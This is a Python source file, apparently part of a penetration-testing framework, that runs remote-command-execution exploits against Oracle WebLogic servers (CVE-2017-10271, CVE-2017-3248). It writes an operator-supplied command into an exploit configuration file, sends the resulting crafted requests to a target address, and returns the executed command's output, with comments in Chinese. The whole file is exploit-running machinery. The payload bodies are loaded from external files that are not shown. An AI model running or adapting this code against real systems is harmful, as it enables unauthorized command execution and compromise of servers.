#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/11/17 12:19 上午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : rocCommondController.py
# @Software: PyCharm

import configparser
import re
import time
import requests
import os
import ast
import importlib
import json
import base64
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import browsermobproxy



requests.packages.urllib3.disable_warnings()

class rocCommandController(object):
    def __init__(self):
        self.name = "CVE_2017_10271_weblogic"

    def _init_proxy(self):
        """
        初始化代理服务
        """
        # 代理服务（这里是macOX的调用文件）
        path = r"/Users/rocky/pene_tool/rocComExpRce/jarpackage/browsermob-proxy-2.1.4/bin/browsermob-proxy"
        # 初始化一个代理Manager服务，并监听8180端口
        self.server = browsermobproxy.Server(path=path, options={'port': 8089})
        # 启动代理Manager服务
        self.server.start()
        # 向代理Manager服务申请一个代理服务
        self.proxy = self.server.create_proxy()

    def _open_proxy(self, ref):
        """
        打开代理监控(要在网页打开前打开监控)
        :param ref:注册的名称
        :return:
        """
        options = {'captureContent': True, 'captureHeaders': True}
        self.proxy.new_har(ref, options=options)

    def _get_network(self):
        """
        获取请求列表
        """
        # 取出请求列表
        result = self.proxy.har
        # 遍历请求列表信息
        for entry in result['log']['entries']:
            req_url = entry['request']['url']
            resp_content = entry["response"]['content']["text"]

    def runCommand(self, targetAddr, payload,command):
        """
        加载外部程序
        POC检测控制器
        :param targetAddr:
        :param payload:
        :return:
        """
        if payload == "CVE_2017_3248_weblogic":
            pass
            module = 'rocCommandPayload.{}'.format(payload)
            importModule = importlib.import_module(module)
            data = importModule.run.runCommand(self, targetAddr, payload)
            return data
        else:
            getCurPath = os.getcwd()
            configPath = '{}/rocCommandPayload/{}.ini'.format(getCurPath,payload)
            config = configparser.RawConfigParser()
            config.read(configPath)
            node = "rules-req01"
            key = "cmd"
            value = command
            config.set(node,key,value)
            fh = open(configPath, 'w')
            config.write(fh)
            fh.close()
            options = config.sections()

            speciConfig = configparser.ConfigParser()
            speciConfig.read(configPath)
            specioptions = speciConfig.sections()
            currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())


            for option,specioption in zip(options,specioptions):
                if (re.match('rules', option)) is not None:
                    method = config.get(option, 'method')
                    cmd = config.get(option,'cmd')
                    if method == "POST":
                        header = speciConfig.get(specioption, 'header')
                        path = config.get(option, 'path')
                        body = config.get(option, 'body')
                        expression = config.get(option, 'expression')
                        url = targetAddr + path
                        print(url)

                        try:
                            header_dict = ast.literal_eval(header)
                            proxies = {
                                'http': '127.0.0.1:8089',
                                'https': '127.0.0.1:8089'
                            }
                            res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict,proxies=proxies)
                            # driver.quit()
                            print(body)
                            # res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict)
                            print(res.text)
                            command_data = res.text
                            # print(res.data.decode("utf-8"))
                            # command_result = json.loads(res.content)
                            # print(command_result)
                            # command_data = command_result['output']

                            if expression not in res.text:
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content'}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    elif method == "GET":
                        header = speciConfig.get(specioption, 'header')
                        path = config.get(option, 'path')
                        # expression = config.get(option, 'expression')
                        url = targetAddr + path


                        try:
                            header_dict = ast.literal_eval(header)
                            # print(1)
                            # http = urllib3.PoolManager(timeout = 4.0)
                            # print(body)
                            # proxies = {
                            #     'http': '127.0.0.1:8089',
                            #     'https': '127.0.0.1:8089'
                            # }
                            # res = requests.post(url, data=body, verify=False, timeout=5, headers=header_dict,proxies=proxies)

                            res = requests.get(url, verify=False, timeout=5, headers=header_dict)

                            print(res.text)
                            # print(res.data.decode("utf-8"))

                            command_result = json.loads(res.content)
                            # print(command_result)
                            command_data = command_result['output']
                            print(command_data)

                            if "<html" not in res.text and "<TITLE" not in res.text :
                                try:
                                    return {'status': 20000, 'data': command_data, 'type': 'content'}
                                except Exception as e:
                                    pass
                                command_data = '[+] Command Successfull {}'.format(currentTime)
                                return {'status': 20000, 'data': command_data, 'type': 'status'}
                            else:
                                command_data = '[-] Command Failed {}'.format(currentTime)
                                return {'status': 20001, 'data': command_data, 'type': 'status'}
                        except requests.exceptions.RequestException as e:
                            status_data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
                            return {'status': 20002, 'data': status_data, 'type': 'status'}
                    else:
                        pass

